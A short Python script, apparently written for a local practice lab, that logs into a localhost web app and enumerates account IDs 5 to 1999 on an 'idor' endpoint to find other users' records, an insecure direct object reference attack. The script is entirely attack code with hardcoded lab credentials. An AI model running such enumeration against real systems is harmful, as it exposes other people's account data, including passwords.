import requests


def login(session):
    payload = {'login': 'klaus', 'password': 'aicrag'}
    response = session.post('http://localhost/idor/login.php', data=payload)


def check(session, lol):
    payload = {'id': lol}
    response = session.get('http://localhost/idor/check.php?', params=payload)
    return response.content !='<h1>User account: </h1><h2> Your login: </h2><h2> Your email: </h2><h2> Your name: </h2><h2> Your password: </h2>'

s = requests.Session()
login(s)
for number in range(5,2000):
    if(check(s, number)):
        print (number)